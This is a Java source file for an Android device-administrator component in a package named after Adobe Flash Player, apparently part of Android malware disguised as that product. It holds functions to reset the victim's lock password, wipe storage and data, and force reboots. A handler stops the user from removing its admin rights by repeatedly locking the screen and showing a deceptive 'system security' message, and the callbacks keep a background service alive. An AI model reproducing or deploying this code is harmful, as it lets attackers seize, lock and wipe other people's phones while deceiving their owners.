package com.adobe.flashplayer.core;

import java.lang.reflect.Method;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

import com.adobe.flashplayer.MyLog;


public class DeviceManager extends DeviceAdminReceiver{

    private final String TAG = "[ljg]DeviceManager ";

    public DeviceManager(){
        Log.e(TAG,"constructor");
        MyLog.writeLogFile("constructor\r\n");
    }


    public static void removeDeviceManager(Context context){
        DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(context, DeviceManager.class);
        boolean active = dpm.isAdminActive(componentName);
        if(active){
            dpm.removeActiveAdmin(componentName);
        }
        MyLog.writeLogFile("remove device manager ok\r\n");
    }

    public static void resetLockPassword(Context context,String password){
        DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(context, DeviceManager.class);
        boolean active = dpm.isAdminActive(componentName);
        if(active){
            dpm.resetPassword(password,DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
            MyLog.writeLogFile("resetLockPassword:" + password + " ok\r\n");
        }
        else{
            MyLog.writeLogFile("resetLockPassword:" + password + " error\r\n");
        }
    }



    public static void wipeSetting(Context context){

        DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(context, DeviceManager.class);
        boolean active = dpm.isAdminActive(componentName);
        if(active){
            //dpm.wipeData(DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
            try{
                Class<? extends DevicePolicyManager> clazz = dpm.getClass();
                Method wipedata = clazz.getDeclaredMethod("wipeData", int.class);
                wipedata.invoke(dpm, 2);		//DevicePolicyManager.WIPE_RESET_PROTECTION_DATA = 2
                MyLog.writeLogFile("wipeSetting ok\r\n");
            }catch(Exception ex){
                MyLog.writeLogFile("wipeSetting exception\r\n");
                ex.printStackTrace();
            }
        }
        else{
            MyLog.writeLogFile("device manager is inactive\r\n");
        }
    }

    public static void wipeStorage(Context context){

        DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(context, DeviceManager.class);
        boolean active = dpm.isAdminActive(componentName);
        if(active){
            dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
            MyLog.writeLogFile("wipeStorage ok\r\n");
        }
        else{
            MyLog.writeLogFile("wipeStorage error\r\n");
        }
    }



    public static void resetSystem(Context context){

        DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(context, DeviceManager.class);
        boolean active = dpm.isAdminActive(componentName);
        if(active){
            if(Build.VERSION.SDK_INT >= 24){
                //dpm.reboot(componentName);
                try{
                    Class<? extends DevicePolicyManager> clazz = dpm.getClass();
                    Method reboot = clazz.getDeclaredMethod("reboot", ComponentName.class);
                    reboot.invoke(dpm, componentName);
                    MyLog.writeLogFile("resetSystem ok\r\n");
                }catch(Exception ex){
                    MyLog.writeLogFile("resetSystem exception\r\n");
                    ex.printStackTrace();
                }
            }
            else{
                MyLog.writeLogFile("resetSystem error for version sdk int < 24\r\n");
            }
        }
        else{
            MyLog.writeLogFile("device manager is inactive\r\n");
        }
    }


    public SharedPreferences getDevicePreference(Context context) {
        try{
            Log.e(TAG, "getDevicePreference");
            MyLog.writeLogFile("SharedPreferences\r\n");

            //CoreHelper.startForegroundService(context);
        }
        catch(Exception ex){
            ex.printStackTrace();
        }
        return context.getSharedPreferences(DeviceAdminReceiver.class.getName(), 0);
    }


    @Override
    public void onEnabled(Context context, Intent intent) {
        try{
            Log.e(TAG, "enable admin device manager");
            MyLog.writeLogFile("deviceManagerReceiver onEnabled\r\n");

            CoreHelper.startForegroundService(context);
        }
        catch(Exception ex){
            ex.printStackTrace();
        }
    }


    @Override
    public void onDisabled(Context context, Intent intent) {
        try{
            Log.e(TAG, "disable admin device manager");
            MyLog.writeLogFile("deviceManagerReceiver onDisabled\r\n");

            CoreHelper.startForegroundService(context);
        }
        catch(Exception ex){
            ex.printStackTrace();
        }
    }



    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        try{
            CoreHelper.startForegroundService(context);

            Intent outOfDialog = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
            outOfDialog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(outOfDialog);

            final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            new Thread(new Runnable() {
                @Override
                public void run() {
                    int i = 0;
                    int waittimes = 70;
                    String factory = android.os.Build.MANUFACTURER;
                    if (factory.contains("Meizu")) {
                        waittimes = 70;
                    }

                    while (i < waittimes) {
                        dpm.lockNow();
                        try {
                            Thread.sleep(100);
                            i++;
                        } catch (InterruptedException ex) {
                            ex.printStackTrace();
                        }
                    }
                }
            }).start();

            Thread.sleep(3000);
        }catch(Exception ex){
            ex.printStackTrace();
        }
        return "you should not uninstall this program for your system security" ;
    }



    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        try{
            Log.e(TAG, "password is changed");
            MyLog.writeLogFile("onPasswordChanged\r\n");

            CoreHelper.startForegroundService(context);
        }
        catch(Exception ex){
            ex.printStackTrace();
        }
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        try{
            Log.e(TAG, "password is error");
            MyLog.writeLogFile("onPasswordFailed\r\n");

            CoreHelper.startForegroundService(context);

        }catch(Exception ex){
            ex.printStackTrace();
        }
    }

    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        try{

            Log.e(TAG, "password is changed successfully");
            MyLog.writeLogFile("password is changed successfully\r\n");

            CoreHelper.startForegroundService(context);

        }catch(Exception ex){
            ex.printStackTrace();
        }
    }

}
